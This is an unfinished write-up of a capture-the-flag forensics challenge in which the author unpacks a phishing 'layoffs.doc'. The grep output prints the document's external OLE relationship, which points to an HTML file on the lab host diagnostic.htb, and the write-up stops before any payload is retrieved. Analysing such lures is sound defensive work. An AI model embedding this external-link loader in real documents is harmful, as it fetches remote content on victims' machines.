WIP
> Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.
#### Steps
1. Connecting to the instance with `nc` returned nothing, so I navigated to the webpage
2. The webpage returned a `404`, so I added the domain from the description to my host file
```shell
└─$ sudo sh -c "echo '94.237.62.195 diagnostic.htb' >> /etc/hosts"
```
3. Navigating to `http://94.237.62.195:43141/layoffs.doc`, I downloaded the doc file
```shell
└─$ file diagnostic.doc
diagnostic.doc: Zip archive data, at least v2.0 to extract, compression method=store
```
4. Unzipping the file, I got the directories `docProp`, `word`, `_rels`, and a `Content_types` xml document
5. All of the directories contained xml files
6. I recursively grepped for `html` to see if I cound find any other pages hosted on the instance
```shell
└─$ grep -r html
_rels/document.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://diagnostic.htb:43141/223_index_style_fancy.html!" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/></Relationships>
document.xml:   </v:shape><o:OLEObject Type="Link" ProgID="htmlfile" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="rId996" UpdateMode="OnCall">
```
7. `Target="http://diagnostic.htb:43141/223_index_style_fancy.html!"`
8. At this point I waited so long for the site to load that I just restarted the instance (which didn't work)
9. Soooooo I'll come back later
